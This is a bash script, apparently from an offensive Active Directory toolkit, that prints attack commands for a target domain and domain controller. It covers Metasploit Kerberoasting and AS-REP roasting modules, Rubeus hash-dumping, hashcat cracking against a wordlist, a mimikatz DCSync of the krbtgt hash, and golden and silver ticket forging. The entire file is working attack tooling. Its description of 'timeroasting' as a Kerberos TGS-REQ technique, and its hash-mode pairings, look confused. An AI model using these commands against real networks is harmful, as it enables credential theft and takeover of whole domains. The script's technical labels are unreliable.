#!/usr/bin/env bash
# ==============================================================================
# TIMEROASTING — Kerberos TGS-REQ to crack service account hashes
# Usage: bash timeroasting.sh <DOMAIN> <DC_IP>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
DOMAIN="${1:-}"; DC="${2:-}"
[[ -z "$DOMAIN" || -z "$DC" ]] && { echo "Usage: bash timeroasting.sh <DOMAIN> <DC_IP>"; exit 1; }
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c; run"; echo "$c"; }
echo ""; echo "=== TIMEROASTING — Domain: $DOMAIN, DC: $DC ==="; echo ""
echo -e "--- ${BLUE}Kerberoasting (TGS-REQ)${NC} ---"
$IN_MSF && run_msf "auxiliary/gather/kerberoast" "DOMAIN $DOMAIN" "RHOSTS $DC"
echo ""
echo -e "--- ${BLUE}AS-REP Roasting${NC} ---"
$IN_MSF && run_msf "auxiliary/gather/asrep_roast" "DOMAIN $DOMAIN" "RHOSTS $DC"
echo ""
echo -e "--- ${BLUE}Timeroasting (TGS-REQ without PAC)${NC} ---"
echo "# Use Rubeus:"
echo "Rubeus.exe timeroast /domain:$DOMAIN /dc:$DC /outfile:timeroast.hashes"
echo "# Or without PAC:"
echo "Rubeus.exe timeroast /domain:$DOMAIN /dc:$DC /nowrap /outfile:nopac.hashes"
echo ""
echo -e "--- ${BLUE}Cracking with Hashcat${NC} ---"
echo "hashcat -m 13100 timeroast.hashes /usr/share/wordlists/rockyou.txt"
echo "hashcat -m 19600 nopac.hashes /usr/share/wordlists/rockyou.txt"
echo ""
echo -e "--- ${BLUE}Metasploit${NC} ---"
$IN_MSF && run_msf "auxiliary/gather/kerberos_enumusers" "DOMAIN $DOMAIN" "RHOSTS $DC"
echo ""
echo -e "--- ${BLUE}Silver/Golden Tickets${NC} ---"
echo "# Get krbtgt hash via DCSync:"
echo "mimikatz # 'lsadump::dcsync /domain:$DOMAIN /user:krbtgt'"
echo "# Golden Ticket:"
echo "mimikatz # 'kerberos::golden /domain:$DOMAIN /sid:<SID> /krbtgt:<NTLM> /user:Administrator /ptt'"
echo "# Silver Ticket:"
echo "mimikatz # 'kerberos::golden /domain:$DOMAIN /sid:<SID> /target:<SPN> /service:<SERVICE> /rc4:<NTLM> /ptt'"
